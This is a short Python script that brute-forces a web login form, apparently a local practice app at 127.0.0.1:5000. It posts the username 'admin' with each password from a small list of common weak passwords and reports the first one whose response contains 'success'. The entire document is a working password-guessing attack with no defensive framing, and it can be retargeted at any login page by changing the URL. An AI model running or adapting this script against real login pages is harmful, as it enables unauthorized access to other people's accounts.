import requests

url = "http://127.0.0.1:5000/"
username = "admin"

password_list = [
    "123",
    "admin",
    "123456",
    "password",
    "admin123"
]

for password in password_list:
    data = {
        "username": username,
        "password": password
    }
    r = requests.post(url, data=data)
    if "success" in r.text:
        print("✅ Password found:", password)
        break
    else:
        print("❌ Tried:", password)